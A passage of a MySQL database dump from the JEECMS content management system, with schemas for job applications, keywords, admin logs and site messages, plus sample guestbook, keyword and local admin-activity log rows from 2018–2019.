INSERT INTO `jc_guestbook_ext` VALUES (5, '网店和论坛的用户管理和jeecms 可以统一起来吗？	', '网店和论坛的用户管理和jeecms 可以统一起来吗？	', NULL, NULL, NULL, NULL);
INSERT INTO `jc_guestbook_ext` VALUES (6, '请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小	', '请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小	', NULL, NULL, NULL, NULL);

-- ----------------------------
-- Table structure for jc_job_apply
-- ----------------------------
DROP TABLE IF EXISTS `jc_job_apply`;
CREATE TABLE `jc_job_apply`  (
  `job_apply_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户id',
  `content_id` int(11) NOT NULL COMMENT '职位id',
  `apply_time` datetime NOT NULL COMMENT '申请时间',
  PRIMARY KEY (`job_apply_id`) USING BTREE,
  INDEX `fk_jc_job_apply_user`(`user_id`) USING BTREE,
  INDEX `fk_jc_job_apply_content`(`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_job_apply_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_job_apply_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '职位申请表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_keyword
-- ----------------------------
DROP TABLE IF EXISTS `jc_keyword`;
CREATE TABLE `jc_keyword`  (
  `keyword_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NULL DEFAULT NULL COMMENT '站点ID',
  `keyword_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '链接',
  `is_disabled` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否禁用',
  PRIMARY KEY (`keyword_id`) USING BTREE,
  INDEX `fk_jc_keyword_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_keyword_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容关键词表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_keyword
-- ----------------------------
INSERT INTO `jc_keyword` VALUES (1, NULL, '内容管理系统', '<a href=\"http://www.jeecms.com/\" target=\"_blank\">内容管理系统</a>', 0);

-- ----------------------------
-- Table structure for jc_log
-- ----------------------------
DROP TABLE IF EXISTS `jc_log`;
CREATE TABLE `jc_log`  (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NULL DEFAULT NULL,
  `site_id` int(11) NULL DEFAULT NULL,
  `category` int(11) NOT NULL COMMENT '日志类型',
  `log_time` datetime NOT NULL COMMENT '日志时间',
  `ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'IP地址',
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'URL地址',
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '日志标题',
  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '日志内容',
  PRIMARY KEY (`log_id`) USING BTREE,
  INDEX `fk_jc_log_site`(`site_id`) USING BTREE,
  INDEX `fk_jc_log_user`(`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_log_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_log_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 131 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS日志表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_log
-- ----------------------------
INSERT INTO `jc_log` VALUES (1, 1, 1, 3, '2018-11-22 14:39:22', '127.0.0.1', '/jeecmsv8f/api/admin/content/update', '修改文章', 'id=130;title=党中央推进民族工作创新发展纪实');
INSERT INTO `jc_log` VALUES (2, 1, 1, 3, '2018-11-22 14:39:39', '127.0.0.1', '/jeecmsv8f/api/admin/content/update', '修改文章', 'id=130;title=党中央推进民族工作创新发展纪实');
INSERT INTO `jc_log` VALUES (3, 1, 1, 3, '2018-11-22 14:44:45', '127.0.0.1', '/jeecmsv8f/api/admin/config/mark_update', '修改水印设置', NULL);
INSERT INTO `jc_log` VALUES (4, 1, 1, 3, '2018-11-22 15:18:03', '127.0.0.1', '/jeecmsv8f/api/admin/admin/global_update', '修改用户', 'id=1;username=admin');
INSERT INTO `jc_log` VALUES (5, 1, 1, 3, '2018-11-22 15:19:46', '127.0.0.1', '/jeecmsv8f/api/admin/site_config/base_update', '站点基本设置', NULL);
INSERT INTO `jc_log` VALUES (6, 1, 1, 3, '2018-11-22 15:20:15', '127.0.0.1', '/jeecmsv8f/api/admin/config/system_update', '修改系统设置', NULL);
INSERT INTO `jc_log` VALUES (7, 1, 1, 3, '2018-11-22 15:20:21', '127.0.0.1', '/jeecmsv8f/api/admin/config/system_update', '修改系统设置', NULL);
INSERT INTO `jc_log` VALUES (8, 1, 1, 3, '2018-11-27 17:05:47', '127.0.0.1', '/menhu/api/admin/model/save', '增加模型', 'id=2222;name=test');
INSERT INTO `jc_log` VALUES (9, 1, 1, 3, '2018-11-30 09:58:47', '127.0.0.1', '/menhu/api/admin/file/delete', '删除资源', 'filename=/u/cms/www/201607/15143710qqqk.jpg');
INSERT INTO `jc_log` VALUES (10, 1, 1, 3, '2018-11-30 10:10:56', '127.0.0.1', '/menhu/api/admin/model/update', '修改模型', 'id=2222;name=test');
INSERT INTO `jc_log` VALUES (11, 1, 1, 3, '2018-11-30 10:12:08', '127.0.0.1', '/menhu/api/admin/model/update', '修改模型', 'id=2222;name=模板测试');
INSERT INTO `jc_log` VALUES (12, 1, 1, 3, '2018-11-30 10:13:15', '127.0.0.1', '/menhu/api/admin/channel/save', '增加栏目', 'id=94;title=mbcs');
INSERT INTO `jc_log` VALUES (13, 1, 1, 3, '2018-11-30 10:14:33', '127.0.0.1', '/menhu/api/admin/topic/save', '增加专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (14, 1, 1, 3, '2018-11-30 10:16:35', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=149;title=杀人啦');
INSERT INTO `jc_log` VALUES (15, 1, 1, 3, '2018-11-30 10:16:44', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=149;title=杀人啦');
INSERT INTO `jc_log` VALUES (16, 1, 1, 3, '2018-11-30 10:18:41', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (17, 1, 1, 3, '2018-11-30 10:20:45', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (18, 1, 1, 3, '2018-11-30 10:22:38', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (19, 1, 1, 3, '2018-11-30 10:23:26', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=150;title=test');
INSERT INTO `jc_log` VALUES (20, 1, 1, 3, '2018-11-30 10:23:28', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=151;title=test');
INSERT INTO `jc_log` VALUES (21, 1, 1, 3, '2018-11-30 10:23:29', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=152;title=test');
INSERT INTO `jc_log` VALUES (22, 1, 1, 3, '2018-11-30 10:23:31', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=153;title=test');
INSERT INTO `jc_log` VALUES (23, 1, 1, 3, '2018-11-30 10:23:33', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=154;title=test');
INSERT INTO `jc_log` VALUES (24, 1, 1, 3, '2018-11-30 10:26:30', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=154;title=test');
INSERT INTO `jc_log` VALUES (25, 1, 1, 3, '2018-11-30 10:26:58', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=154;title=test');
INSERT INTO `jc_log` VALUES (26, 1, 1, 3, '2018-11-30 10:48:22', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=154;title=test');
INSERT INTO `jc_log` VALUES (27, 1, 1, 3, '2018-11-30 10:48:33', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (28, 1, 1, 3, '2018-11-30 10:48:41', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (29, 1, 1, 3, '2018-11-30 10:55:55', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (30, 1, 1, 3, '2018-11-30 10:58:05', '127.0.0.1', '/menhu/api/admin/model/update', '修改模型', 'id=2222;name=模板测试');
INSERT INTO `jc_log` VALUES (31, 1, 1, 3, '2018-11-30 10:58:21', '127.0.0.1', '/menhu/api/admin/model/update', '修改模型', 'id=2222;name=模板测试');
INSERT INTO `jc_log` VALUES (32, 1, 1, 3, '2018-11-30 10:59:23', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=154;title=test');
INSERT INTO `jc_log` VALUES (33, 1, 1, 3, '2018-11-30 10:59:41', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (34, 1, 1, 3, '2018-11-30 10:59:50', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (35, 1, 1, 3, '2018-11-30 11:01:33', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=154;title=test');
INSERT INTO `jc_log` VALUES (36, 1, 1, 3, '2018-11-30 11:01:44', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (37, 1, 1, 3, '2018-11-30 11:01:49', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (38, 1, 1, 3, '2018-11-30 11:02:30', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=154;title=test');
INSERT INTO `jc_log` VALUES (39, 1, 1, 3, '2018-11-30 11:04:37', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (40, 1, 1, 3, '2018-11-30 11:06:36', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=155;title=423423');
INSERT INTO `jc_log` VALUES (41, 1, 1, 3, '2018-11-30 11:06:38', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=156;title=423423');
INSERT INTO `jc_log` VALUES (42, 1, 1, 3, '2018-11-30 11:06:38', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=157;title=423423');
INSERT INTO `jc_log` VALUES (43, 1, 1, 3, '2018-11-30 11:16:28', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=157;title=423423');
INSERT INTO `jc_log` VALUES (44, 1, 1, 3, '2018-11-30 13:50:46', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (45, 1, 1, 3, '2018-11-30 13:50:56', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=3;name=2015全国两会');
INSERT INTO `jc_log` VALUES (46, 1, 1, 3, '2018-11-30 14:42:06', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=158;title=211');
INSERT INTO `jc_log` VALUES (47, 1, 1, 3, '2018-11-30 14:51:30', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (48, 1, 1, 3, '2018-11-30 15:03:16', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (49, 1, 1, 3, '2018-11-30 15:03:23', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (50, 1, 1, 3, '2018-11-30 15:04:12', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=159;title=测试成功？');
INSERT INTO `jc_log` VALUES (51, 1, 1, 3, '2018-11-30 15:04:42', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=160;title=xlb');
INSERT INTO `jc_log` VALUES (52, 1, 1, 3, '2018-11-30 15:11:29', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (53, 1, 1, 3, '2018-11-30 15:12:47', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=161;title=423423');
INSERT INTO `jc_log` VALUES (54, 1, 1, 3, '2018-11-30 15:14:20', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (55, 1, 1, 3, '2018-11-30 15:22:40', '127.0.0.1', '/menhu/api/admin/model/update', '修改模型', 'id=2222;name=模板测试');
INSERT INTO `jc_log` VALUES (56, 1, 1, 3, '2018-11-30 15:23:31', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=162;title=4223');
INSERT INTO `jc_log` VALUES (57, 1, 1, 3, '2018-11-30 15:24:10', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=163;title=嗯嗯翁无');
INSERT INTO `jc_log` VALUES (58, 1, 1, 3, '2018-11-30 15:26:31', '127.0.0.1', '/menhu/api/admin/channel/update', '修改栏目', 'id=94;name=模板测试喽');
INSERT INTO `jc_log` VALUES (59, 1, 1, 3, '2018-11-30 15:26:56', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (60, 1, 1, 3, '2018-11-30 15:27:40', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=164;title=eeee');
INSERT INTO `jc_log` VALUES (61, 1, 1, 3, '2018-11-30 15:31:48', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=164;title=eeee');
INSERT INTO `jc_log` VALUES (62, 1, 1, 3, '2018-11-30 15:55:47', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=164;title=小徐的测试');
INSERT INTO `jc_log` VALUES (63, 1, 1, 3, '2018-11-30 16:09:29', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=165;title=大家好');
INSERT INTO `jc_log` VALUES (64, 1, 1, 3, '2018-11-30 16:17:51', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=165;title=大家好');
INSERT INTO `jc_log` VALUES (65, 1, 1, 3, '2018-12-04 11:49:23', '127.0.0.1', '/menhu/api/admin/site_config/base_update', '站点基本设置', NULL);
INSERT INTO `jc_log` VALUES (66, 1, 1, 3, '2018-12-04 11:49:27', '127.0.0.1', '/menhu/api/admin/site_config/base_update', '站点基本设置', NULL);
INSERT INTO `jc_log` VALUES (67, 1, 1, 3, '2018-12-10 11:32:17', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=165;title=大家好');
INSERT INTO `jc_log` VALUES (68, 1, 1, 3, '2018-12-11 14:31:33', '127.0.0.1', '/menhu/api/admin/friendlink/update', '修改友情链接', 'id=3;name=京东商城');
INSERT INTO `jc_log` VALUES (69, 1, 1, 3, '2018-12-11 14:31:43', '127.0.0.1', '/menhu/api/admin/friendlink/delete', '删除友情链接', 'id=4;name=当当网');
INSERT INTO `jc_log` VALUES (70, 1, 1, 3, '2018-12-11 14:31:43', '127.0.0.1', '/menhu/api/admin/friendlink/delete', '删除友情链接', 'id=5;name=亚马逊');
INSERT INTO `jc_log` VALUES (71, 1, 1, 3, '2018-12-11 14:31:43', '127.0.0.1', '/menhu/api/admin/friendlink/delete', '删除友情链接', 'id=6;name=ihush');
INSERT INTO `jc_log` VALUES (72, 1, 1, 3, '2018-12-11 15:05:09', '127.0.0.1', '/menhu/api/admin/friendlink/update', '修改友情链接', 'id=1;name=JEECMS官网');
INSERT INTO `jc_log` VALUES (73, 1, 1, 3, '2018-12-28 15:40:29', '127.0.0.1', '/menhu/api/admin/acquisition/delete', '删除采集', 'id=1;name=测试采集');
INSERT INTO `jc_log` VALUES (74, 1, 1, 3, '2019-01-11 14:57:28', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=165;title=大家好111');
INSERT INTO `jc_log` VALUES (75, 1, 1, 3, '2019-01-11 14:57:45', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=165;title=大家好');
INSERT INTO `jc_log` VALUES (76, 1, 1, 3, '2019-01-11 14:57:54', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=165;title=大家好');
INSERT INTO `jc_log` VALUES (77, 1, 1, 3, '2019-01-21 10:25:07', '127.0.0.1', '/menhu/api/admin/model/save', '增加模型', 'id=9;name=模型学习');
INSERT INTO `jc_log` VALUES (78, 1, 1, 3, '2019-01-21 10:58:35', '127.0.0.1', '/menhu/api/admin/topic/delete', '删除专题', 'id=4;name=模板测试专题');
INSERT INTO `jc_log` VALUES (79, 1, 1, 3, '2019-01-23 14:51:49', '127.0.0.1', '/menhu/api/admin/channel/delete', '删除栏目', 'id=94;title=null');
INSERT INTO `jc_log` VALUES (80, 1, 1, 3, '2019-01-23 14:56:08', '127.0.0.1', '/menhu/api/admin/model/delete', '删除模型', 'id=2222;name=模板测试');
INSERT INTO `jc_log` VALUES (81, 1, 1, 3, '2019-01-23 14:59:43', '127.0.0.1', '/menhu/api/admin/model/update', '修改模型', 'id=9;name=面试');
INSERT INTO `jc_log` VALUES (82, 1, 1, 3, '2019-01-23 15:05:53', '127.0.0.1', '/menhu/api/admin/model/update', '修改模型', 'id=9;name=面试模型');
INSERT INTO `jc_log` VALUES (83, 1, 1, 3, '2019-01-25 14:38:22', '127.0.0.1', '/menhu/api/admin/channel/save', '增加栏目', 'id=94;title=null');
INSERT INTO `jc_log` VALUES (84, 1, 1, 3, '2019-01-25 14:40:34', '127.0.0.1', '/menhu/api/admin/topic/save', '增加专题', 'id=4;name=招聘、面试专题发布');
INSERT INTO `jc_log` VALUES (85, 1, 1, 3, '2019-01-25 14:41:45', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=招聘、面试专题发布');
INSERT INTO `jc_log` VALUES (86, 1, 1, 3, '2019-01-25 14:43:20', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=48;title=阿里巴巴招生啦啦啦');
INSERT INTO `jc_log` VALUES (87, 1, 1, 3, '2019-01-25 15:21:09', '127.0.0.1', '/menhu/api/admin/model/update', '修改模型', 'id=9;name=面试模型');
INSERT INTO `jc_log` VALUES (88, 1, 1, 3, '2019-01-25 15:37:49', '127.0.0.1', '/menhu/api/admin/topic/delete', '删除专题', 'id=3;name=2015全国两会');
INSERT INTO `jc_log` VALUES (89, 1, 1, 3, '2019-01-25 15:37:50', '127.0.0.1', '/menhu/api/admin/topic/delete', '删除专题', 'id=2;name=互联网+与传统产业升级之道');
INSERT INTO `jc_log` VALUES (90, 1, 1, 3, '2019-01-25 15:37:50', '127.0.0.1', '/menhu/api/admin/topic/delete', '删除专题', 'id=1;name= 2016饲料英才网络招聘会');
INSERT INTO `jc_log` VALUES (91, 1, 1, 3, '2019-01-25 16:07:01', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=招聘、面试专题发布');
INSERT INTO `jc_log` VALUES (92, 1, 1, 3, '2019-01-25 16:13:13', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=招聘、面试专题发布');
INSERT INTO `jc_log` VALUES (93, 1, 1, 3, '2019-01-25 17:17:13', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=49;title=黄金接连下跌难道又等大妈来托盘');
INSERT INTO `jc_log` VALUES (94, 1, 1, 3, '2019-01-25 17:19:33', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=50;title=中国空军航空兵赴南海常态化战斗巡航');
INSERT INTO `jc_log` VALUES (95, 1, 1, 3, '2019-01-25 17:23:34', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=50;title=中国空军航空兵赴南海常态化战斗巡航');
INSERT INTO `jc_log` VALUES (96, 1, 1, 3, '2019-01-25 17:29:50', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=51;title=宛如置身黑客帝国 “啤酒丛林”惊艳...');
INSERT INTO `jc_log` VALUES (97, 1, 1, 3, '2019-01-25 17:31:30', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=52;title= 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_log` VALUES (98, 1, 1, 3, '2019-01-28 09:57:52', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=招聘、面试专题发布');
INSERT INTO `jc_log` VALUES (99, 1, 1, 3, '2019-01-28 10:02:05', '127.0.0.1', '/menhu/api/admin/topic/save', '增加专题', 'id=5;name=视频类专题');
INSERT INTO `jc_log` VALUES (100, 1, 1, 3, '2019-01-28 10:16:59', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=53;title=美女云集只为等你');
INSERT INTO `jc_log` VALUES (101, 1, 1, 3, '2019-01-28 10:20:42', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=54;title=111');
INSERT INTO `jc_log` VALUES (102, 1, 1, 3, '2019-01-28 10:20:43', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=55;title=111');
INSERT INTO `jc_log` VALUES (103, 1, 1, 3, '2019-01-28 10:20:45', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=56;title=111');
INSERT INTO `jc_log` VALUES (104, 1, 1, 3, '2019-01-28 10:21:33', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=56;title=111');
INSERT INTO `jc_log` VALUES (105, 1, 1, 3, '2019-01-28 10:22:37', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=56;title=111');
INSERT INTO `jc_log` VALUES (106, 1, 1, 3, '2019-01-28 14:42:13', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=53;title=美女云集只为等你');
INSERT INTO `jc_log` VALUES (107, 1, 1, 3, '2019-01-28 14:42:50', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=53;title=美女云集只为等你');
INSERT INTO `jc_log` VALUES (108, 1, 1, 3, '2019-01-28 16:29:15', '127.0.0.1', '/menhu/api/admin/site_config/base_update', '站点基本设置', NULL);
INSERT INTO `jc_log` VALUES (109, 1, 1, 3, '2019-01-28 16:29:28', '127.0.0.1', '/menhu/api/admin/config/system_update', '修改系统设置', NULL);
INSERT INTO `jc_log` VALUES (110, 1, 1, 3, '2019-01-28 16:29:35', '127.0.0.1', '/menhu/api/admin/site_config/base_update', '站点基本设置', NULL);
INSERT INTO `jc_log` VALUES (111, 1, 1, 3, '2019-01-28 16:31:00', '127.0.0.1', '/menhu/api/admin/topic/save', '增加专题', 'id=6;name=通用专题');
INSERT INTO `jc_log` VALUES (112, 1, 1, 3, '2019-01-28 16:31:12', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=52;title= 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_log` VALUES (113, 1, 1, 3, '2019-01-28 16:31:51', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=52;title= 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_log` VALUES (114, 1, 1, 3, '2019-01-28 16:32:00', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=50;title=中国空军航空兵赴南海常态化战斗巡航');
INSERT INTO `jc_log` VALUES (115, 1, 1, 3, '2019-01-28 16:33:06', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=52;title= 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_log` VALUES (116, 1, 1, 3, '2019-01-28 16:42:00', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=57;title=“一带一路”：习近平打开的“筑梦空间”');
INSERT INTO `jc_log` VALUES (117, 1, 1, 3, '2019-01-28 16:42:02', '127.0.0.1', '/menhu/api/admin/content/save', '增加文章', 'id=58;title=“一带一路”：习近平打开的“筑梦空间”');
INSERT INTO `jc_log` VALUES (118, 1, 1, 3, '2019-01-28 16:44:08', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=53;title=美女云集只为等你');
INSERT INTO `jc_log` VALUES (119, 1, 1, 3, '2019-01-28 16:45:21', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=52;title= 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_log` VALUES (120, 1, 1, 3, '2019-01-28 16:45:41', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=52;title= 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_log` VALUES (121, 1, 1, 3, '2019-01-28 16:46:00', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=52;title= 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_log` VALUES (122, 1, 1, 3, '2019-01-28 16:46:54', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=52;title= 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_log` VALUES (123, 1, 1, 3, '2019-01-28 16:48:24', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=49;title=黄金接连下跌难道又等大妈来托盘');
INSERT INTO `jc_log` VALUES (124, 1, 1, 3, '2019-01-28 16:51:54', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=6;name=通用专题');
INSERT INTO `jc_log` VALUES (125, 1, 1, 3, '2019-01-28 16:52:02', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=5;name=视频类专题');
INSERT INTO `jc_log` VALUES (126, 1, 1, 3, '2019-01-28 16:52:15', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=招聘、面试专题发布');
INSERT INTO `jc_log` VALUES (127, 1, 1, 3, '2019-01-28 16:56:25', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=6;name=通用专题');
INSERT INTO `jc_log` VALUES (128, 1, 1, 3, '2019-01-28 16:56:34', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=5;name=视频类专题');
INSERT INTO `jc_log` VALUES (129, 1, 1, 3, '2019-01-28 16:56:45', '127.0.0.1', '/menhu/api/admin/topic/update', '修改专题', 'id=4;name=招聘、面试专题发布');
INSERT INTO `jc_log` VALUES (130, 1, 1, 3, '2019-01-28 16:59:38', '127.0.0.1', '/menhu/api/admin/content/update', '修改文章', 'id=51;title=宛如置身黑客帝国 “啤酒丛林”惊艳...');

-- ----------------------------
-- Table structure for jc_message
-- ----------------------------
DROP TABLE IF EXISTS `jc_message`;
CREATE TABLE `jc_message`  (
  `msg_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT 1 COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT 0 COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT 1 COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT 0 COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT 1 COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  PRIMARY KEY (`msg_id`) USING BTREE,
  INDEX `fk_jc_message_user_send`(`msg_send_user`) USING BTREE,
  INDEX `fk_jc_message_user_receiver`(`msg_receiver_user`) USING BTREE,
  INDEX `fk_jc_message_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
